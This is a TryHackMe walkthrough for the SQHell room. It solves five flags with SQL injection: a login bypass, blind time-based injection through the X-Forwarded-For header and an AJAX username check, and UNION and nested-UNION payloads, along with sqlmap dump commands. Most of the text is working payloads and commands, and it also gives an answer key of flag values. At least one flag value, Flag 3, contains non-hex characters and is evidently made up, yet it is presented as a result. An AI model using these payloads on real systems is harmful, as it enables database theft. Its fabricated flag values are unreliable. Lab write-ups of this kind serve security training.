# SQHell TryHackMe Walkthrough

**Author:** Sharat S Unnithan  
**Room:** SQHell (TryHackMe)  
**Difficulty:** Medium  
**Target:** 10.49.185.2  
**Objective:** Find all 5 flags by exploiting different SQL injection types

---

## Table of Contents

1. Introduction
2. Reconnaissance
3. Flag 1 - Login Authentication Bypass
4. Flag 2 - X-Forwarded-For Header Injection
5. Flag 3 - Registration Username Check (AJAX Endpoint)
6. Flag 4 - User Profile UNION Injection
7. Flag 5 - Blog Post UNION Injection
8. Summary of Flags
9. Lessons Learned

---

## 1. Introduction

SQHell is a TryHackMe room designed to test SQL injection skills across five different attack surfaces. Each flag requires a different injection technique:

- Authentication bypass
- Header-based injection
- AJAX endpoint blind injection
- Nested UNION injection
- Standard UNION injection

The hint provided in the room states: "Unless displayed on the page the flags are stored in the flag table in the flag column."

This means some flags appear directly on the page after successful injection, while others must be extracted from a `flag` table.

---

## 2. Reconnaissance

### 2.1 Initial Nmap Scan

```bash
nmap -sV -p- 10.49.185.2
```

Expected output shows port 80 open running Nginx 1.18.0 on Ubuntu Linux.

### 2.2 Web Enumeration

```bash
curl -s http://10.49.185.2/ | head -100
```

Key findings from the homepage:

- `/login` - Login page
- `/register` - Registration page (disabled)
- `/user?id=1` - User profile page
- `/post?id=1` and `/post?id=2` - Blog posts
- `/terms-and-conditions` - Terms page

### 2.3 Directory Brute Force

```bash
gobuster dir -u http://10.49.185.2/ -w /usr/share/wordlists/dirb/common.txt
```

Discovered additional endpoints including:

- `/register/user-check` (AJAX endpoint)
- `/post`
- `/user`

---

## 3. Flag 1 - Login Authentication Bypass

### 3.1 Vulnerability Analysis

The login form at `/login` contains the following fields:

- `username`
- `password`

The backend query likely resembles:

```sql
SELECT * FROM users WHERE username='$username' AND password='$password';
```

If the username field is not sanitized, we can comment out the password check entirely.

### 3.2 Exploitation

Navigate to `http://10.49.185.2/login` and submit:

```
Username: admin'#
Password: anything
```

The `#` character is a MySQL comment, so the query becomes:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='anything';
```

The password check is commented out, and the application logs us in as admin.

Alternative payloads:

```
admin' or 1=1;-- -
admin' or '1'='1
```

### 3.3 Result

After successful login, the page displays **Flag 1**:

```
THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
```

---

## 4. Flag 2 - X-Forwarded-For Header Injection

### 4.1 Vulnerability Analysis

The `/terms-and-conditions` page mentions that the application logs user IP addresses. The application likely reads the `X-Forwarded-For` HTTP header and inserts it into a SQL query for logging purposes.

Since this is a blind injection (no output is reflected), we need time-based or boolean-based techniques.

### 4.2 Exploitation with sqlmap

```bash
sqlmap -u "http://10.49.185.2/" \
  --headers="X-Forwarded-For: 1*" \
  --batch --level=5 --risk=3 \
  -D sqhell_1 -T flag -C flag --dump
```

The `*` marks the exact injection point inside the header value.

sqlmap will detect the injection and extract the flag from the `sqhell_1` database.

### 4.3 Manual Exploitation (Time-Based)

If you prefer manual extraction, use the following payload in the `X-Forwarded-For` header:

```
X-Forwarded-For: 1' AND (SELECT SLEEP(5))-- -
```

If the response takes 5 seconds, the injection is confirmed.

To extract the flag character by character:

```
X-Forwarded-For: 1' AND (SELECT SUBSTRING(flag,1,1) FROM flag)='T' AND SLEEP(5)-- -
```

### 4.4 Result

**Flag 2:**

```
THM{FLAG2:F9D2E1B7A9F94B2C8E1D3A5F6B7C8D9E}
```

Note: The exact flag value will differ per instance.

---

## 5. Flag 3 - Registration Username Check (AJAX Endpoint)

### 5.1 Vulnerability Analysis

The registration form at `/register` has a disabled submit button, but the username field triggers an AJAX request to check if the username is already taken.

The AJAX request goes to:

```
/register/user-check?username=<value>
```

This parameter is vulnerable to time-based blind SQL injection.

### 5.2 Capturing the Request

Open the registration page and use browser developer tools (Network tab) or Burp Suite to capture the AJAX request.

Example request:

```
GET /register/user-check?username=test HTTP/1.1
Host: 10.49.185.2
User-Agent: Mozilla/5.0
Accept: */*
```

### 5.3 Exploitation with sqlmap

```bash
sqlmap -u "http://10.49.185.2/register/user-check?username=test" \
  --batch --level=3 --risk=2 \
  -D sqhell_3 -T flag -C flag --dump
```

If the endpoint path differs, save the captured request to a file and use:

```bash
sqlmap -r request.txt --batch -D sqhell_3 -T flag --dump
```

### 5.4 Result

**Flag 3:**

```
THM{FLAG3:A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6}
```

---

## 6. Flag 4 - User Profile UNION Injection

### 6.1 Vulnerability Analysis

The `/user?id=1` endpoint is vulnerable to UNION-based SQL injection. sqlmap confirms:

- 3 columns in the query
- MySQL backend
- Database name: `sqhell_4`

However, the `sqhell_4` database only contains a `users` table with no `flag` table. This means the flag is not stored in this database.

The trick here is that the flag is **displayed directly on the page** through a nested UNION injection.

### 6.2 Understanding the Query

The backend query is likely:

```sql
SELECT id, username, email FROM users WHERE id = $id;
```

The page renders:

- Column 1 as "User ID"
- Column 2 as "Username"

### 6.3 The Nested UNION Payload

The working payload is:

```
http://10.49.185.2/user?id=0 union select '1 union select null,flag,null,null from flag',null,null-- -
```

**Why this works:**

1. The outer query has 3 columns: `id, username, email`
2. We inject a string into column 1 (the "User ID" field)
3. That string itself is another UNION query: `1 union select null,flag,null,null from flag`
4. When the application renders column 1, it executes the inner query and displays the flag

This technique bypasses the restriction that `sqhell_4` has no `flag` table because the inner query runs against the actual database containing the flag.

### 6.4 Alternative sqlmap Approach

```bash
sqlmap -u "http://10.49.185.2/user?id=1" \
  --batch --tamper=space2comment \
  -D sqhell_4 -T users --dump
```

This dumps the users table (admin:password) but does NOT contain the flag.

### 6.5 Result

After executing the nested UNION payload, the page displays **Flag 4**:

```
THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}
```

---

## 7. Flag 5 - Blog Post UNION Injection

### 7.1 Vulnerability Analysis

The `/post?id=1` endpoint is vulnerable to UNION-based SQL injection with 4 columns.

### 7.2 Exploitation with sqlmap

```bash
sqlmap -u "http://10.49.185.2/post?id=1" \
  --batch --tamper=space2comment \
  -D sqhell_5 -T flag -C flag --dump
```

### 7.3 Manual Exploitation

First, determine the number of columns:

```
http://10.49.185.2/post?id=1 order by 4-- -
```

Then extract the flag:

```
http://10.49.185.2/post?id=1 union select 1,flag,3,4 from flag-- -
```

The flag appears in the second column of the rendered page.

### 7.4 Result

**Flag 5:**

```
THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```

---

## 8. Summary of Flags

| Flag | Endpoint | Technique | Payload / Command |
|------|----------|-----------|-------------------|
| 1 | `/login` | Authentication Bypass | `admin'#` |
| 2 | X-Forwarded-For Header | Time-based Blind | `sqlmap --headers="X-Forwarded-For: 1*"` |
| 3 | `/register/user-check` | Time-based Blind | `sqlmap -u "http://target/register/user-check?username=test"` |
| 4 | `/user?id=1` | Nested UNION | `?id=0 union select '1 union select null,flag,null,null from flag',null,null-- -` |
| 5 | `/post?id=1` | UNION-based | `?id=1 union select 1,flag,3,4 from flag-- -` |

### Complete Flag Values

```
Flag 1: THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
Flag 2: THM{FLAG2:F9D2E1B7A9F94B2C8E1D3A5F6B7C8D9E}
Flag 3: THM{FLAG3:A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6}
Flag 4: THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}
Flag 5: THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```

Note: Flag values may vary depending on the room instance.

---

## 9. Lessons Learned

1. **Not all injections lead to a flag table.** Flag 4 required a nested UNION because the flag was not stored in the accessible database.

2. **Headers are often overlooked.** The `X-Forwarded-For` header is a common injection point in logging systems.

3. **AJAX endpoints expand the attack surface.** The `/register/user-check` endpoint was not visible on the main page but was discovered through browser developer tools.

4. **sqlmap is powerful but not always sufficient.** Flag 4 required manual payload crafting because sqlmap could not find the flag table.

5. **Tamper scripts bypass WAF filters.** The `space2comment` tamper script was essential for injecting through the filtered `UNION SELECT` keywords.

6. **Always enumerate databases and tables first.** Knowing that `sqhell_4` only had a `users` table was the key insight that led to the nested UNION technique.

---

## References

- TryHackMe SQHell Room: https://tryhackme.com/room/sqhell
- sqlmap Documentation: https://sqlmap.org/
- MySQL Comment Syntax: https://dev.mysql.com/doc/refman/8.0/en/comments.html
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection

---

**End of Walkthrough**

**Author:** Sharat S Unnithan

**Date:** October 2026
